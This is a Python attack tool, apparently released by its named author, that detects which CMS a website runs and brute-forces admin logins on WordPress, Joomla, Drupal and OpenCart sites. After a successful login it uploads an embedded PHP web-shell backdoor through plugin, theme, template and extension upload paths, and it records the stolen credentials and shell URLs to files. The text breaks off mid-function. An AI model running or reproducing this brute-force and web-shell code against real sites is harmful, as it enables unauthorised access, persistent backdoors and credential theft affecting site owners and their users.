#CMSBrute & Auto Shell Upload
import os
import re,json,time,base64,time
from random import sample
from datetime import datetime
try:
	import requests
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
	exit()
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.dummy import Pool as ThreadPool
	xxx = False
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
				executor.map(check,list)
				executor.shutdown(wait=True)
		except Exception as e:
			pass
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
red = '\x1b[31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
RIPON = False
ToolConfig = {"fileuser":False,"wp":False}
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
def SETWordlist():
	os.system(['clear', 'cls'][(os.name == 'nt')])
	print(r+logo+"""\n    {}I Don't Aspect Any Responsibility For Bad Ussage!{}\n\n Author: {}The Black_Phish{}\n Name: {}{}{}\n Application: {}Python 2.7 & 3.9 Supported{}\n Chose a Tool:{}\n  1. Use Custom Wordlist\n  2. Use Small Wordlist\n  3. Use Big Wordlist
 """.format(g,y,c,y,c,"Wordlist Setup",y,c,m,w))
	try:
		cmd = Ret(g+" Choice"+w+":"+c+"~"+m+"# "+r)
	except:
		print(" Tool Exit!")
		exit()
	if cmd == "1":
		name = "custom.txt"
	elif cmd == "2":
		name = "small.txt"
	else:
		name = "big.txt"
	try:
		open("wordlist/wordlist.cnf","w").write("wordlist/"+name)
		print(g+" [+] "+w+"Wordlist Setup Succesfull! Please restart the tool.")
		exit()
	except:
		pass
	
try:
	wordlistname = open("wordlist/wordlist.cnf",'r').read()
except:
	SETWordlist()
	exit()
try:
	passw = open(wordlistname,"r").read().splitlines()
except:
	print(" [+] Password file missing?")
	exit()
try:
	opencartusers = open("files/opencart-users.txt","r").read().splitlines()
except:
	print(" [+] Opencart User file missing?")
	exit()
try:
	drupalusers = open("files/drupal-users.txt","r").read().splitlines()
except:
	print(" [+] Drupal Users file missing?")
	exit()
try:
	joomlausers = open("files/joomla-users.txt","r").read().splitlines()
except:
	print(" [+] Joomla users file missing?")
	exit()
try:
	othereusers = open("files/other-users.txt","r").read().splitlines()
except:
	print(" [+] Othere users file missing?")
	exit()
try:
	os.mkdir("result")
except:
	pass
try:
	os.mkdir("cms")
except:
	pass
red = '\x1b[1;31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
shell = """
<!DOCTYPE html>
<html>
<head>
  <title>Hacked By @Salahdin1337</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "./";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>"""
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def FILTERPASS(username,i,url,wordlist):
	domain = str(url.replace("www.","")).split(".")[0]
	if "[DOMAIN]" in i:
		passw = i.replace("[DOMAIN]",domain)
		if passw not in wordlist:
			return passw
		else:
			return False
	if "[AZDOMAIN]" in i:
		passw = i.replace("[AZDOMAIN]",url)
		if passw not in wordlist:
			return passw
		else:
			return False
	if "[UPPERALL]" in i:
		passw = i.replace("[UPPERALL]",domain.upper())
		if passw not in wordlist:
			return passw
		else:
			return False
	if "[UPPERLOGIN]" in i:
		passw = i.replace("[UPPERLOGIN]",username.upper())
		if passw not in wordlist:
			return passw
		else:
			return False
	if "[USERLOGIN]" in i:
		passw = i.replace("[USERLOGIN]",username)
		if passw not in wordlist:
			return passw
		else:
			return False
	return i
def saved(x,y):
	i = x
	i = i.replace("http://","")
	i = i.replace("https://","")
	i = i.replace("www.","")
	i = i.split("/")
	i = i[0]
	try:
		m = open(y,"r").read()
	except:
		open(y,"w")
		m = open(y,"r").read()
	if i in m:
		pass
	else:
		open(y,"a").write(x+"\n")
#--------------------------------------------------------------#
#AutoShell Joomla & Opencart
def rand(lenth):
	return ('').join(sample('abcdefghijklmnopqrstuvwxyz',lenth))
def JoomlaShell(url,sess):
	shellname = "ripon"+rand(3)
	bs64name = base64.b64encode(('/'+shellname+'.php').encode('utf-8')).decode('utf-8')
	try:
		r = sess.get('http://'+url+'/administrator/index.php?option=com_templates&view=templates',headers=headers,timeout=25,verify=False)
		ahref = re.findall('<td class="template-name">\n\t\t\t\t\t\t<a href="(.*)">',r.content.decode("utf-8"))[0]
		if '&amp' in ahref:
			turl = str(ahref).replace('&amp;', '&')
		else:
			turl = ahref
		try:
			rx = sess.get('http://'+url.split('/')[0]+turl,headers=headers,timeout=25,verify=False)
		except:
			rx = sess.get('http://'+url.split('/')[0]+turl,headers=headers,timeout=25,verify=False)
		try:
			token = re.findall('{"csrf.token":"(.*)",',rx.content.decode("utf-8"))[0].split('"')[0]
		except:
			try:
				token = re.findall('<input type="hidden" name="(.*)" value="1" />',rx.content.decode("utf-8"))[0]
			except:
				print(" [+] Token Not Found! ")
				return False
		try:
			tid = re.findall('option=com_templates&view=template&id=(.*)&file=aG9tZQ==',turl)[0]
		except:
			print(' [+] Theme id not found!')
			return 0
		perm = {'option': 'com_templates','task': 'template.createFile','id': str(tid),'file': 'aG9tZQ'}
		data = {'name': shellname,'type': 'php','address': '',str(token): 1}
		try:
			submit = sess.post('http://'+url+ '/administrator/index.php',params=perm,data=data,headers=headers,timeout=25,verify=False)
		except Exception as e:
			submit = sess.post('http://'+url+ '/administrator/index.php',params=perm,data=data,headers=headers,timeout=25,verify=False)
		if 'class="alert alert-success"' in submit.content.decode("utf-8"):
			par = {'option': 'com_templates', 'view': 'template','id': str(tid),'file': bs64name}
			Data = {'jform[source]': shell,'task': 'template.apply','jform[filename]': '/{}.php'.format(shellname),'jform[extension_id]': str(tid),str(token): 1}
			try:
				shellz = sess.post('http://'+url+'/administrator/index.php', params=par, data=Data,headers=headers,timeout=25,verify=False)
			except Exception as e:
				shellz = sess.post('http://'+url+'/administrator/index.php', params=par, data=Data,headers=headers,timeout=25,verify=False)
			if 'class="alert alert-success"' in shellz.content.decode("utf-8"):
				try:
					checkshell = sess.get('http://'+url+'/templates/beez3/'+shellname+'.php',headers=headers,timeout=25,verify=False)
				except:
					checkshell = sess.get('http://'+url+'/templates/beez3/'+shellname+'.php',headers=headers,timeout=25,verify=False)
				if '@Salahdin1337' in checkshell.content.decode("utf-8"):
					rez(url,"ShellUpload","1")
					with open('result/Shellz.txt', 'a') as writer:
						writer.write(('{}/templates/beez3/{}\n').format(url,shellname+'.php'))
				else:
					rez(url,'ShellUpload','5')
	except Exception as e:
		pass
def OpencartAutoShell(site,sess,splitx,sourcecode,tok):
	try:
		token = re.findall(splitx,sourcecode)[0].split('"')[0]
		try:
			url = site+'/admin/index.php?route=marketplace/installer/upload&'+tok+token
			files = {'file': ('facebook_ads_extension.ocmod.zip',open('files/black.zip', 'rb'))}
			try:
				shell = sess.post('http://'+url,files=files,headers=headers,timeout=25,verify=False)
			except:
				shell = sess.post('http://'+url,files=files,headers=headers,timeout=25,verify=False)
			try:
				nx = str(shell.content.decode("utf-8")).split('extension_install_id=')[1].split('"}')[0]
			except Exception as e:
				return rez(site,'ShellUpload',"5")
			try:
				st1 = url.replace('marketplace/installer/upload', 'marketplace/install/install')+'&extension_install_id='+nx
				sess.post('http://'+st1,headers=headers,timeout=25,verify=False)
			except:
				st1 = url.replace('marketplace/installer/upload', 'marketplace/install/install')+'&extension_install_id='+nx
				sess.post('http://'+st1,headers=headers,timeout=25,verify=False)
			try:
				st2 = st1.replace('marketplace/install/install','marketplace/install/unzip')
				sess.post('http://'+st2,headers=headers,timeout=25,verify=False)
			except:
				st2 = st1.replace('marketplace/install/install','marketplace/install/unzip')
				sess.post('http://'+st2,headers=headers,timeout=25,verify=False)
			try:
				st3 = st1.replace('marketplace/install/install','marketplace/install/move')
				sess.post('http://'+st3,headers=headers,timeout=25,verify=False)
			except:
				st3 = st1.replace('marketplace/install/install','marketplace/install/move')
				sess.post('http://'+st3,headers=headers,timeout=25,verify=False)
			try:
				st4 = st1.replace('marketplace/install/install','marketplace/install/xml')
				sess.post('http://'+st4,headers=headers,timeout=25,verify=False)
			except:
				st4 = st1.replace('marketplace/install/install','marketplace/install/xml')
				sess.post('http://'+st4,headers=headers,timeout=25,verify=False)
			try:
				st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
				sess.post('http://'+st5,headers=headers,timeout=25,verify=False)
			except:
				st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
				sess.post('http://'+st5,headers=headers,timeout=25,verify=False)
			try:
				shellcheck = requests.get("http://"+site+"/admin/controller/extension/facebookproductfeed.php",headers=headers,timeout=25,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get("http://"+site+"/admin/controller/extension/facebookproductfeed.php",headers=headers,timeout=25,verify=False).content.decode("utf-8")
			if 'Black_Phish' in shellcheck:
				rez(site+'/admin/controller/extension/facebookproductfeed.php','ShellUpload','1')
				try:
					with open("result/shells.txt","a") as wr:
						wr.write(site+'/admin/controller/extension/facebookproductfeed.php\n')
				except:
					pass
			else:
				rez(site,'ShellUpload','no')
		except Exception as e:
			pass
	except Exception as e:
		pass
#--------------------------------------------------------------#
#Cms Detector
def Cms(site,num):
	CHK = lambda x,y: True if (x == "0" or x == y) else False
	headers =  {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	if num == "1":
		target = ['/','/wp-includes/js/jquery/jquery.js','/wp-login.php']
	elif num == "2":
		target = ['/administrator/help/en-GB/toc.json','/administrator/language/en-GB/install.xml','/plugins/system/debug/debug.xml','/administrator/']
	elif num == "3":
		target = ['/misc/ajax.js','/']
	elif num == "4":
		target = ['/admin/view/javascript/common.js']
	elif num == "5":
		target = ['/admin/includes/general.js']
	elif num == "6":
		target = ['/']
	elif num == "7":
		target = ['/images/editor/separator.gif','/js/header-rollup-554.js']
	else:
		num = "0"
		target = ['/','/wp-login.php','/wp-includes/js/jquery/jquery.js','/administrator/help/en-GB/toc.json','/administrator/language/en-GB/install.xml','/plugins/system/debug/debug.xml','/administrator/','/misc/ajax.js','/admin/view/javascript/common.js','/admin/includes/general.js','/images/editor/separator.gif','/js/header-rollup-554.js']
	for dir in target:
		try:
			r = requests.get('http://'+site+dir,headers=headers,timeout=25,verify=False).content.decode("utf-8")
			if CHK(num,"1") == True:
				if 'name="wp-submit"' in r:
					save(site,'Wordpress.txt')
					rez(site,'Wordpress','1')
					return 'wordpress'
				elif '/wp-content/' in r or '/wp-inclues/' in r:
					save(site,'Wordpress.txt')
					rez(site,'Wordpress','1')
					return 'wordpress'
				elif '(c) jQuery Foundation' in r:
					save(site,'Wordpress.txt')
					rez(site,'Wordpress','1')
					return 'wordpress'
			elif CHK(num,"2") == True:
				if '"COMPONENTS_BANNERS_BANNERS"' in r:
					save(site,'Joomla.txt')
					rez(site,'Joomla','1')
					return 'joomla'
				elif '<author>Joomla!' in r:
					save(site,'Joomla.txt')
					rez(site,'Joomla','1')
					return 'joomla'
			elif CHK(num,"3") == True:
				if 'Drupal.ajax' in r:
					save(site,'Drupal.txt')
					rez(site,'Drupal','1')
					return 'drupal'
				elif '/sites/default/files' in r:
					save(site,'Drupal.txt')
					rez(site,'Drupal','1')
					return 'drupal'
			elif CHK(num,"4") == True:
				if 'getURLVar(key)' in r:
					save(site,'Opencart.txt')
					rez(site,'Opencart','1')
					return 'opencart'
			elif CHK(num,"5") == True:
				if 'function SetFocus()' in r:
					save(site,'osCommerce.txt')
					rez(site,'osCommerce','1')
					return 'oscommerce'
			elif CHK(num,"7") == True:
				if 'GIF89a' in r:
					save(site,'vBulletin.txt')
					rez(site,'vBulletin','1')
					return 'vbulletin'
				elif 'js.compressed/modernizr.min.js' in r:
					save(site,'vBulletin.txt')
					rez(site,'vBulletin','1')
					return vbulletin
				elif 'content="vBulletin' in r:
					save(site,'vBulletin.txt')
					rez(site,'vBulletin','1')
					return 'vbulletin'
			elif CHK(num,"6") == True:
				if 'var prestashop =' in r:
					save(site,'Preatshop.txt')
					rez(site,'Preatshop','1')
					return 'preatshop'
			elif CHK(num,"6") == True:
				if 'Magento' in r:
					save(site,'Magento.txt')
					rez(site,'Magento','1')
					return 'magento'
			else:
				pass
		except Exception as e:
			rez(site,'Connection','2')
	if num == "0":
		try:
			requests.get('http://'+site+'/',headers=headers,timeout=25,verify=False)
			rez(site,'Unknown','1')
			save(site,'Unknown.txt')
			return 'unknown'
		except:
			return 'diedtarget'
	else:
		rez(site,'CMS','2')
def save(site,file):
	try:
		with open('cms/'+file,'a') as write:
			write.write(site+'\n')
	except:
		pass
#--------------------------------------------------------------#
#Drupal BruteForce
def Drupal(site):
	passlist = passw
	if ToolConfig["fileuser"] == True:
		userlist = drupalusers
		userlist.append(site.replace("www.","").split(".")[0]+"@"+site.replace("www.",""))
		userlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.","")+site.replace("www.",""))
		passlist.append(site.replace("www.","")+"1")
		passlist.append(site.replace("www.","")+"12")
		passlist.append(site.replace("www.","")+'123')
		passlist.append(site.replace("www.","")+'1234')
		passlist.append(site.replace("www.","")+'12345')
		if "." in site:
			userlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0]+"1")
			passlist.append(site.replace("www.","").split(".")[0]+"12")
			passlist.append(site.replace("www.","").split(".")[0]+"123")
			passlist.append(site.replace("www.","").split(".")[0]+"1234")
			passlist.append(site.replace("www.","").split(".")[0]+"1235")
	else:
		uselist = ["admin"]
	for user in userlist:
		for passwd in passlist:
			passwd = FILTERPASS(user,passwd,site,passlist)
			if passwd == False:
				continue
			try:
				sess = requests.session()
				try:
					r = sess.get('http://'+site+'/user/login',headers=headers,timeout=25,verify=False)
				except:
					r = sess.get('http://'+site+ '/user/login',headers=headers,timeout=25,verify=False)
				try:
					bid = re.findall('name="form_build_id" value="(.*)"',r.content.decode("utf-8"))[0]
					fid = re.findall('name="form_id" value="(.*)"',r.content.decode("utf-8"))[0]
				except:
					bid = ''
					fid = ''
					return False
				data = {'name': user,'pass': passwd,'form_build_id': bid,'form_id': fid,'op': 'Log+in'}
				url = 'http://'+site+ '/user/login'
				try:
					login = sess.post(url,data=data,headers=headers,timeout=25,verify=False)
				except:
					login = sess.post(url,data=data,headers=headers,timeout=25,verify=False)
				chkk = login.content.decode("utf-8")
				if 'Log out' in login.content.decode("utf-8") and 'edit' in login.content.decode("utf-8") and "type='password'" not in (chkk.lower()).replace('"',"'"):
					rez(site," Drupal "+"| "+user+" | "+passwd,"1")
					with open('result/Drupal_Hacked.txt', 'a') as writer:
						writer.write('http://'+site+ '/user/login'+'\n Username: '+user+'\n Password: '+passwd+'\n-----------------------------------------\n')
					break
				else:
					rez(site," Drupal "+"| "+user+" | "+passwd,"n1")
			except Exception as e:
				pass
#--------------------------------------------------------------#
#Joomla BruteForce            
def Joomla(site):
	passlist = passw
	if ToolConfig["fileuser"] == True:
		userlist = joomlausers
		userlist.append(site.replace("www.","").split(".")[0]+"@"+site.replace("www.",""))
		userlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.","")+site.replace("www.",""))
		passlist.append(site.replace("www.","")+"1")
		passlist.append(site.replace("www.","")+"12")
		passlist.append(site.replace("www.","")+'123')
		passlist.append(site.replace("www.","")+'1234')
		passlist.append(site.replace("www.","")+'12345')
		if "." in site:
			userlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0]+"1")
			passlist.append(site.replace("www.","").split(".")[0]+"12")
			passlist.append(site.replace("www.","").split(".")[0]+"123")
			passlist.append(site.replace("www.","").split(".")[0]+"1234")
			passlist.append(site.replace("www.","").split(".")[0]+"1235")
	else:
		userlist = ["admin"]
	for username in userlist:
		for passwd in passlist:
			passwd = FILTERPASS(username,passwd,site,passlist)
			if passwd == False:
				continue
			try:
				sess = requests.session()
				try:
					r = sess.get('http://'+site+'/administrator/index.php',headers=headers,timeout=25,verify=False)
				except:
					r = sess.get('http://'+site+'/administrator/index.php',headers=headers,timeout=25,verify=False)
				try:
					token = re.findall('type="hidden" name="(.*)" value="1"',r.content.decode("utf-8"))[0]
				except:
					token = ""
				try:
					option = re.findall('type="hidden" name="option" value="(.*)"',r.content.decode("utf-8"))[0]
				except:
					option = 'com_login'
				try:
					ret = re.findall('<input type="hidden" name="return" value="(.*)"/>',r.content.decode("utf-8"))[0]
				except:
					ret = ''
				post = {}
				if ret != '':
					post['return'] = ret
				post['username'] = username
				post['passwd'] = passwd
				post['lang'] = 'en-GB'
				post['option'] = option
				post['task'] = 'login'
				post[token] = '1'
				url = 'http://'+site+'/administrator/index.php'
				try:
					try:
						login = sess.post(url,data=post, headers=headers,timeout=25,verify=False)
					except:
						login = sess.post(url,data=post, headers=headers,timeout=25,verify=False)
					chkkk = login.content.decode("utf-8")
					if 'logout' in login.content.decode("utf-8") and 'user.edit' in login.content.decode("utf-8") and "type='password'" not in (chkkk.lower()).replace('"',"'"):
						rez(site,"JoomlaBruteForce","1")
						with open('result/Joomla_Hacked.txt', 'a') as writer:
							writer.write('http://'+site+ '/administrator/index.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
						JoomlaShell(site,sess)
						break
					else:
						rez(site," Joomla "+"| "+username+" | "+passwd,"n1")
				except Exception as e:
					pass
			except:
				pass
#--------------------------------------------------------------#
#Wordpress BruteForce 
def WpLogin(site,username,passwd):
	shellcheck = "None"
	sess =requests.session()
	try:
		rvalue = "./wp-admin/"
		svalue = 'Log+In'
		data = {'log': username,'pwd': passwd,'wp-submit': svalue,'redirect_to': rvalue,'testcookie': '1'}
		url = site + '/wp-login.php'
		try:
			login = sess.post('http://'+url,data=data,headers=headers,timeout=25,verify=False)
		except:
			login = sess.post('http://'+url,data=data,headers=headers,timeout=25,verify=False)
		try:
			txt = login.content.decode("utf-8")
			if ('/wp-admin/profile.php' in txt or "<li id='wp-admin-bar" in txt or 'wp-settings-time' in str(sess.cookies)) and '<input type="password"' not in txt:
				with open("result/LoginSuccess.txt","a") as w:
					w.write('http://'+site+ '/wp-login.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
				rez(site,'TryingAutoShell','1')
				try:
					source = sess.get(login.url+'/plugin-install.php?tab=upload',headers=headers,timeout=25,verify=False).content.decode("utf-8")
				except:
					source = sess.get(login.url+'/plugin-install.php?tab=upload',headers=headers,timeout=25,verify=False).content.decode("utf-8")
				try:
					whr = re.findall('name="_wp_http_referer" value="(.*)"',source)[0].split('"')[0]
				except:
					whr = login.url+'/plugin-install.php?tab=upload'
				try:
					wpnonce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source)[0]
					data = {'_wpnonce': wpnonce,'_wp_http_referer': whr,'filename': 'ripon.php'}
				except:
					try:
						wpnonce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"',source)[0]
						data = {'nonce': wpnonce,'_wp_http_referer': whr,'filename': 'ripon.php'}
					except:
						wpnonce = False
				if wpnonce != False:
					try:
						dpath = str(datetime.date(datetime.now()))
						dpath = dpath.split('-')
						files = {'pluginzip': ('ripon.php',shell)}
						try:
							sess.post(login.url+'/update.php?action=upload-plugin',data=data,files=files,headers=headers,timeout=25,verify=False)
						except Exception as e:
							sess.post(login.url+'/update.php?action=upload-plugin',data=data,files=files,headers=headers,timeout=25,verify=False)
						try:
							shellcheck = sess.get('http://'+site+('/wp-content/uploads/{}/{}/ripon.php').format(str(dpath[0]),str(dpath[1])),headers=headers,timeout=25,verify=False).content.decode("utf-8")
						except:
							shellcheck = sess.get('http://'+site+('/wp-content/uploads/{}/{}/ripon.php').format(str(dpath[0]),str(dpath[1])),headers=headers,timeout=25,verify=False).content.decode("utf-8")
					except:
						pass
				if '@Salahdin1337' in shellcheck:
					with open("result/Shellz.txt","a") as wr:
						wr.write('http://'+site+('/wp-content/uploads/{}/{}/ripon.php').format(str(dpath[0]),str(dpath[1]))+"\n")
					return rez(site,"ShellUpload","1")
				else:
					try:
						try:
							source = sess.get(login.url+'/plugin-install.php?tab=upload',headers=headers,timeout=25,verify=False).content.decode("utf-8")
						except:
							source = sess.get(login.url+'/plugin-install.php?tab=upload',headers=headers,timeout=25,verify=False).content.decode("utf-8")
						try:
							whr = re.findall('name="_wp_http_referer" value="(.*)"',source)[0].split('"')[0]
						except:
								whr = login.url+'/plugin-install.php?tab=upload'
						try:
							wpnonce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source)[0]
							data = {'_wpnonce': wpnonce,'_wp_http_referer': whr,'filename': 'umc.zip'}
						except:
							try:
								wpnonce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"',source)[0]
								data = {'nonce': wpnonce,'_wp_http_referer': whr,'filename': 'umc.zip'}
							except:
								wpnonce = False
						if wpnonce  != False:
							files = {'pluginzip': ('umc.zip',open("files/UMC.zip","rb"),'multipart/form-data')}
							try:
								sess.post(login.url+'/update.php?action=upload-plugin',data=data,files=files,headers=headers,timeout=25,verify=False)
							except Exception as e:
								sess.post(login.url+'/update.php?action=upload-plugin',data=data,files=files,headers=headers,timeout=25,verify=False)
							try:
								shellcheck = sess.get('http://'+site+'/wp-content/plugins/UMC/up.php',headers=headers,timeout=25,verify=False).content.decode("utf-8")
							except:
								shellcheck = sess.get('http://'+site+'/wp-content/plugins/UMC/up.php',headers=headers,timeout=25,verify=False).content.decode("utf-8")
					except:
						pass
				if '@Salahdin1337' in shellcheck:
					with open("result/Shellz.txt","a") as wr:
						wr.write('http://'+site+'/wp-content/plugins/UMC/up.php'+"\n")
					return rez(site,"ShellUpload","1")			
				else:
					try:
						headers['X-Requested-With'] = 'XMLHttpRequest'
						headers['Referer'] = 'http://{}/wp-admin/theme-editor.php?file=search.php'.format(site)
						try:
							rx = sess.get(login.url+'/theme-editor.php?file=search.php',headers=headers,timeout=25,verify=False)
						except:
							rx = sess.get(login.url+'theme-editor.php?file=search.php',headers=headers,timeout=25,verify=False)
						try:
							name = re.findall('<option value="(.*)" selected="selected"',rx.content.decode("utf-8"))[0]
						except:
							return 1
						try:
							wpnounce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',rx.content.decode("utf-8"))[0]
							submit = re.findall('id="submit" class="button button-primary" value="(.*)"',rx.content.decode("utf-8"))[0]
							if ' ' in submit:
								submit = str(submit).replace(' ', '+')
							data = {'_wpnonce': wpnounce,'_wp_http_referer': ('./wp-admin/theme-editor.php?file=search.php&theme={}&scrollto=0').format(name),'newcontent': shell,'action': 'update','file': 'search.php','theme': name,'submit': submit}
						except:
							wpnounce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"', rx.content.decode("utf-8"))[0]
							data = {'nonce': wpnounce,'_wp_http_referer': (login.url+'./wp-admin/theme-editor.php?file=search.php&theme={}').format(name),'newcontent': shell,'action': 'edit-theme-plugin-file','file': 'search.php','theme': name,'docs-list': ''}
						try:
							sess.post(login.url+'/admin-ajax.php',data=data,headers=headers,timeout=25,verify=False)
						except:
							sess.post(login.url+'/admin-ajax.php',data=data,headers=headers,timeout=25,verify=False)
						try:
							shellcheck = sess.get('http://'+site+'/wp-content/themes/{}/search.php'.format(name),headers=headers,timeout=25,verify=False).content.decode("utf-8")
						except:
							shellcheck = sess.get('http://'+site+'/wp-content/themes/{}/search.php'.format(name),headers=headers,timeout=25,verify=False).content.decode("utf-8")
						if '@Salahdin1337' in shellcheck:
							with open("result/Shellz.txt","a") as wr:
								wr.write('http://'+site+'/wp-content/themes/{}/search.php'.format(name)+'\n')
							rez(site,'ShellUpload','1')
						else:
							rez(site,'ThemeShell','2')
							#1337
							try:
								try:
									source = sess.get(login.url+'/wp-admin/theme-install.php?browse=featured',headers=headers,timeout=25,verify=False).content.decode("utf-8")
								except:
									source = sess.get(login.url+'/wp-admin/theme-install.php?browse=featured',headers=headers,timeout=25,verify=False).content.decode("utf-8")
								try:
									whr = re.findall('name="_wp_http_referer" value="(.*)"',source)[0].split('"')[0]
								except:
									whr = login.url+'/wp-admin/theme-install.php?browse=featured'
								try:
									wpnonce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source)[0]
									data = {'_wpnonce': wpnonce,'_wp_http_referer': whr,'themezip': 'Salahdin1337.zip'}
								except:
									try:
										wpnonce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"',source)[0]
										data = {'nonce': wpnonce,'_wp_http_referer': whr,'filename': 'Salahdin1337.zip'}
									except:
										wpnonce = False
								if wpnonce  != False:
									files = {'themezip': ('Salahdin1337.zip',open("files/Salahdin1337.zip","rb"),'multipart/form-data')}
									try:
										sess.post(login.url+'/wp-admin/update.php?action=upload-theme',data=data,files=files,headers=headers,timeout=25,verify=False)
									except Exception as e:
										sess.post(login.url+'/update.php?action=upload-plugin',data=data,files=files,headers=headers,timeout=25,verify=False)
									try:
										shellcheck = sess.get('http://'+site+'/wp-content/themes/Salahdin1337/up.php',headers=headers,timeout=25,verify=False).content.decode("utf-8")
									except:
										shellcheck = sess.get('http://'+site+'/wp-content/themes/Salahdin1337/up.php',headers=headers,timeout=25,verify=False).content.decode("utf-8")
							except:
								pass
							if '@Salahdin1337' in shellcheck:
								with open("result/Shellz.txt","a") as wr:
									wr.write('http://'+site+'/wp-content/themes/Salahdin1337/up.php'+"\n")
									return rez(site,"ShellUpload","1")
							else:
								with open('result/Failed_Shell.txt','a') as wr:
									wr.write(site+"#"+username+"#"+passwd+"\n")
								return rez(site,"ShellUpload","1")
							#end 1337
					except:
						pass
			else:
				rez(site," Wordpress"+"| "+username+" | "+passwd,"n1")
		except Exception as e:
			pass
	except Exception as e:
		pass
#--------------------------------------------------------------#
#Opencart BruteForce
def opencart(site):
	passlist = passw
	if ToolConfig["fileuser"] == True:
		userlist = opencartusers
		userlist.append(site.replace("www.","").split(".")[0]+"@"+site.replace("www.",""))
		userlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.","")+site.replace("www.",""))
		passlist.append(site.replace("www.","")+"1")
		passlist.append(site.replace("www.","")+"12")
		passlist.append(site.replace("www.","")+'123')
		passlist.append(site.replace("www.","")+'1234')
		passlist.append(site.replace("www.","")+'12345')
		if "." in site:
			userlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0]+"1")
			passlist.append(site.replace("www.","").split(".")[0]+"12")
			passlist.append(site.replace("www.","").split(".")[0]+"123")
			passlist.append(site.replace("www.","").split(".")[0]+"1234")
			passlist.append(site.replace("www.","").split(".")[0]+"1235")
	else:
		userlist = ["admin"]
	for username in userlist:
		for passwd in passlist:
			try:
				passwd = FILTERPASS(username,passwd,site,passlist)
				if passwd == False:
					continue
			except Exception as e:
				print(e)
			try:
				data = {'username': username,'password': passwd}
				url = 'http://'+site+'/admin/index.php?route=common/login'
				sess = requests.session()
				try:
					login = sess.post(url,data=data,headers=headers,timeout=25,verify=False)
				except:
					login = sess.post(url,data=data,headers=headers,timeout=25,verify=False)
				chkk = login.content.decode("utf-8")
				if 'user_token=' in login.content.decode("utf-8") and "type='password'" not in (chkk.lower()).replace('"',"'"):
					rez(site,'OpencartBruteForce','1')
					with open('result/Opencart_Hacked.txt','a') as wr:
						wr.write('http://'+site+ '/admin/index.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
						OpencartAutoShell(site,sess,';user_token=(.*)">',login.content.decode("utf-8"),'user_token=')
						break
				elif 'token=' in login.content.decode("utf-8") and "type='password'" not in (chkk.lower()).replace('"',"'"):
